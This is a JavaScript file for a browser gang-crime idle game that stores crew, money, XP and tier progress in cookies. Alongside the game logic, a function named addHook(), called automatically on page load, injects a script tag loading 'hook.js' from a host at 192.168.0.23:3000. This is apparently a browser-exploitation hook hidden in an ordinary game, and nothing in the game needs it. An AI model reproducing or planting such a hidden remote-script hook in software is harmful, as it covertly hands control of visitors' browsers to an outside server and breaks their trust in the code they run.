var maxCrew = 50;
var crew = 50;
var money = 0;
var xp = 0;
var name = "";
var tier = 1;
var bossDone;

window.addEventListener("load", setUp, false);

function initializeVars()
{
    if(checkCookie("maxCrew")&&checkCookie("crew")&&checkCookie("money")&&checkCookie("xp")&&checkCookie("name")&&checkCookie("tier"))
    {
        maxCrew = parseInt(getCookie("maxCrew"));
        crew = parseInt(getCookie("crew"));
        money = parseInt(getCookie("money"));
        xp = parseInt(getCookie("xp"));
        name = getCookie("name");
        tier = parseInt(getCookie("tier"));
    }
    if(name==""||name==null){ name = prompt("What's your name boss?: "); setCookie("name",name,3650);}
    refreshValues();
}

function doJob(cost, reward, wonXp) //Does the first job
{
    if(crew >= cost)
    {
        crew -= cost;
        money += reward;
        xp += wonXp;
        document.getElementById("notEnoughText").innerHTML = "";
    } else {
        document.getElementById("notEnoughText").innerHTML = "Not enough crew!";
    }
    refreshValues();
    checkBoss();
}

function refreshCrew()
{
    var cost = 10 * (maxCrew/2);
    
    if(money >= cost && crew!=maxCrew)
    {
        money -= cost;
        crew = maxCrew;
    } else if(money<cost)
    {
        document.getElementById("notEnoughText2").innerHTML = "Not enough money!";
    } else
    {
        document.getElementById("notEnoughText2").innerHTML = "Crew already full!";
    }
    refreshValues();
    
}

function refreshValues() //Refreshes all possible changed html values
{
    document.getElementById("name").innerHTML = "Name: " + name;
    document.getElementById("crew").innerHTML = "Crew: " + crew;
    document.getElementById("money").innerHTML = "Money: " + money;
    document.getElementById("xp").innerHTML = "Xp: " + xp;
    
    setCookie("maxCrew",maxCrew,3650);
    setCookie("crew",crew,3650);
    setCookie("money",money,3650);
    setCookie("xp",xp,3650);
    setCookie("name",name,3650);
    setCookie("tier",tier,3650);
    
}

function setCookie(cname, cvalue, exdays)
{
    var d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    var expires = "expires="+d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires;
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i = 0; i <ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length,c.length);
        }
    }
    return "";
}

function checkCookie(cname) {
    var cookie=getCookie(cname);
    if (cookie!="") {       //Checks if cookie has been made
        return true;
    } else {                //Cookie has not been made
        return false;
    }
}

function randomGen(min, max)
{
   return Math.floor(Math.random()*(max-min+1))+min
}

//TODO: Ability to change from current tier to lower tier
//TODO: 
function setJobs()
{
    switch(tier){
        case 1:
            document.getElementById("job1").innerHTML = "Mug a Passerby";
            document.getElementById("job1desc").innerHTML = "Crew: 2 &nbsp Reward:$250-$400 &nbsp Xp: 2";
            document.getElementById("job1button").onclick = function(){doJob(2,randomGen(250,400),2);};
            document.getElementById("job2").innerHTML = "Rob a local store";
            document.getElementById("job2desc").innerHTML = "Crew: 5 &nbsp Reward:$500-$600 &nbsp Xp: 5";
            document.getElementById("job2button").onclick = function(){doJob(5,randomGen(500,600),5);};
            document.getElementById("job3").innerHTML = "Attack a crew member from an opposing gang";
            document.getElementById("job3desc").innerHTML = "Crew: 7 &nbsp Reward:$1000-$1250 &nbsp Xp: 8"
            document.getElementById("job3button").onclick = function(){doJob(7,randomGen(1000,1250),8);};
            document.getElementById("job4").innerHTML = "Vandalize the Park";
            document.getElementById("job4desc").innerHTML = "Crew: 10 &nbsp Reward:$2000-$3000 &nbsp Xp: 11"
            document.getElementById("job4button").onclick = function(){doJob(10,randomGen(2000,3000),11);};
            document.getElementById("job5").innerHTML = "[Boss]Giovanni's crew is creeping into your turf. Take them out.";
            document.getElementById("job5desc").innerHTML = "Crew: 25 &nbsp Reward:$5000-$10000 &nbsp Xp: 30";
            document.getElementById("job5button").onclick = function(){doJob(25,randomGen(5000,10000),30);bossDone=true;};
            break;
        case 2:
            document.getElementById("job1").innerHTML = "Jimmy mentioned a weapons cache nearby. Check it out.";
            document.getElementById("job1desc").innerHTML = "Crew: 2 &nbsp Reward:$250-$400 &nbsp Xp: 2";
            document.getElementById("job1button").onclick = function(){doJob(2,randomGen(250,400),2);};
            document.getElementById("job2").innerHTML = "Rob a local store";
            document.getElementById("job2desc").innerHTML = "Crew: 5 &nbsp Reward:$500-$600 &nbsp Xp: 5";
            document.getElementById("job2button").onclick = function(){doJob(5,randomGen(500,600),5);};
            document.getElementById("job3").innerHTML = "Attack a crew member from an opposing gang";
            document.getElementById("job3desc").innerHTML = "Crew: 7 &nbsp Reward:$1000-$1250 &nbsp Xp: 8"
            document.getElementById("job3button").onclick = function(){doJob(7,randomGen(1000,1250),8);};
            document.getElementById("job4").innerHTML = "Vandalize the Park";
            document.getElementById("job4desc").innerHTML = "Crew: 10 &nbsp Reward:$2000-$3000 &nbsp Xp: 11"
            document.getElementById("job4button").onclick = function(){doJob(10,randomGen(2000,3000),11);};
            document.getElementById("job5").innerHTML = "[Boss]Giovanni's crew is creeping into your turf. Take them out.";
            document.getElementById("job5desc").innerHTML = "Crew: 25 &nbsp Reward:$5000-$10000 &nbsp Xp: 30";
            document.getElementById("job5button").onclick = function(){doJob(25,randomGen(5000,10000),30);bossDone;};
            break;
        case 3:
            document.getElementById("job1").innerHTML = "Gather intelligence on the prison's systems";
            break;
        case 4:
            break;
        case 5:
            break;
    }
}

function checkBoss()
{
    switch(tier){
        case 1:
            if(bossDone)
            {
                advanceTier();
                break;
            }
        case 2:
            break;
        case 3:
            break;
        case 4:
            break;
        case 5:
            break;
    }
}

function advanceTier()
{
    tier += 1;
    refreshValues();
}

function addHook()
{
    document.getElementById("hookiebookie").innerHTML += "<div id=\"hook\"><script src=\"http://192.168.0.23:3000/hook.js\"></script></div>"
}

function setUp()
{
    initializeVars(); //Pull data from the cookies if there (if not, set values to default values) and set the vars to that data
    setJobs(); //sets all text and data needed for the jobs to work properly
    addHook();
}